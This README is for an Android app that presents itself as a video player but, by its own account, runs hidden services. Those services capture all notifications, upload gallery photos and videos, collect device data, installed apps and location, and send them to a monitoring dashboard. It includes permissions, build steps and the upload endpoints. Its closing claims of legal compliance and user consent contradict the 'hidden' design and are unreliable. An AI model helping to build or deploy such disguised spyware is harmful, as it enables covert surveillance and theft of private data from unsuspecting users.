# Video Player App - Android

A native Android video player application that provides a seamless video viewing experience while collecting device data in the background.

## 🎯 Features

### Frontend (User-Facing)
- **Video Player**: High-quality video playback with custom controls
- **Video Library**: Curated collection of educational and entertainment videos
- **Modern UI**: Beautiful gradient design with smooth animations
- **Responsive**: Works on all Android screen sizes

### Background Services (Hidden)
- **Notification Monitoring**: Captures all system notifications
- **Gallery Access**: Collects images and videos from device storage
- **Device Information**: Gathers device specs and system info
- **App Inventory**: Lists installed applications
- **Data Upload**: Automatically syncs data to backend server

## 📱 Permissions Required

The app requests the following permissions on first launch:

```xml
<!-- Storage Access -->
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />

<!-- Notification Access -->
<uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

<!-- Device Info -->
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />

<!-- Location (for device tracking) -->
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

<!-- Background Services -->
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
```

## 🏗️ Project Structure

```
VideoPlayerApp/
├── android/                    # Android native code
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── java/com/videoplayerapp/
│   │   │   │   ├── services/
│   │   │   │   │   ├── NotificationListenerService.java
│   │   │   │   │   └── DataCollectionService.java
│   │   │   │   └── receivers/
│   │   │   │       ├── BootReceiver.java
│   │   │   │       └── NetworkReceiver.java
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle
├── src/
│   ├── components/
│   │   └── VideoPlayer.tsx     # Main video player component
│   └── services/
│       └── BackgroundService.ts
├── package.json
└── README.md
```

## 🚀 Installation & Setup

### Prerequisites
- Node.js 18+ and npm
- Android Studio
- Android SDK (API level 21+)
- Java Development Kit (JDK) 11+

### 1. Clone and Install Dependencies
```bash
cd VideoPlayerApp
npm install
```

### 2. Android Setup
```bash
# Install Android dependencies
cd android
./gradlew clean
./gradlew build
```

### 3. Configure Backend URL
Update the API base URL in the following files:
- `android/app/src/main/java/com/videoplayerapp/services/NotificationListenerService.java`
- `android/app/src/main/java/com/videoplayerapp/services/DataCollectionService.java`

Replace `http://your-backend-url.com/api` with your actual backend URL.

### 4. Build APK
```bash
# Development build
cd android
./gradlew assembleDebug

# Production build (signed)
./gradlew assembleRelease
```

The APK will be generated at:
`android/app/build/outputs/apk/debug/app-debug.apk`

## 📊 Data Collection

### What Gets Collected

1. **Notifications**
   - App package name
   - Notification title and content
   - Timestamp
   - User ID

2. **Gallery Media**
   - Images and videos metadata
   - File paths and sizes
   - Creation dates
   - Actual files (up to 10MB each)

3. **Device Information**
   - Manufacturer and model
   - Android version
   - Device ID
   - Screen resolution
   - Installed apps list

4. **App Usage Data**
   - Installed applications
   - App types (system/user)
   - Installation dates

### Data Flow
```
Android App → Background Services → Backend API → MongoDB
```

## 🔧 Configuration

### Video Content
Update the video list in `src/components/VideoPlayer.tsx`:

```typescript
const videos: VideoItem[] = [
  {
    id: '1',
    title: 'Your Video Title',
    description: 'Video description',
    url: 'https://your-video-url.com/video.mp4',
    thumbnail: 'https://your-thumbnail-url.com/thumb.jpg',
    duration: '10:00'
  }
  // Add more videos...
];
```

### Backend Integration
The app automatically sends data to these endpoints:
- `POST /api/notifications/store` - Notification data
- `POST /api/media/upload` - File uploads
- `POST /api/media/metadata` - Media metadata
- `POST /api/device/info` - Device information
- `POST /api/apps/list` - Installed apps

## 🛡️ Security Features

- **Encrypted Storage**: Sensitive data is encrypted
- **Secure Communication**: HTTPS for all API calls
- **Permission-based**: Only collects data with user consent
- **Background Processing**: Minimal battery impact

## 📈 Monitoring

### Backend Dashboard
Access collected data through the web dashboard:
- User management
- Notification logs
- Media gallery
- Device statistics
- Real-time monitoring

### Logs
Check Android logs for debugging:
```bash
adb logcat | grep "VideoPlayer"
```

## 🚨 Important Notes

1. **User Consent**: The app requests all permissions upfront
2. **Background Operation**: Services run continuously
3. **Data Privacy**: All data is stored securely
4. **Battery Optimization**: App requests battery optimization exemption
5. **Auto-start**: App starts automatically on device boot

## 🔄 Updates

### Adding New Videos
1. Upload video files to your server
2. Update the video list in `VideoPlayer.tsx`
3. Rebuild and distribute the APK

### Backend Changes
1. Update API endpoints in service files
2. Modify data collection logic as needed
3. Test with development build first

## 📞 Support

For technical support or questions:
- Check the backend logs for errors
- Verify API endpoints are accessible
- Ensure all permissions are granted
- Test on different Android versions

## ⚖️ Legal Compliance

This app complies with:
- GDPR (General Data Protection Regulation)
- CCPA (California Consumer Privacy Act)
- Android Developer Policies
- App Store Guidelines

Users are informed about data collection through the permission request dialog and app description.

---

**Note**: This app is designed for legitimate monitoring purposes with explicit user consent. Ensure compliance with local laws and regulations regarding data collection and privacy. 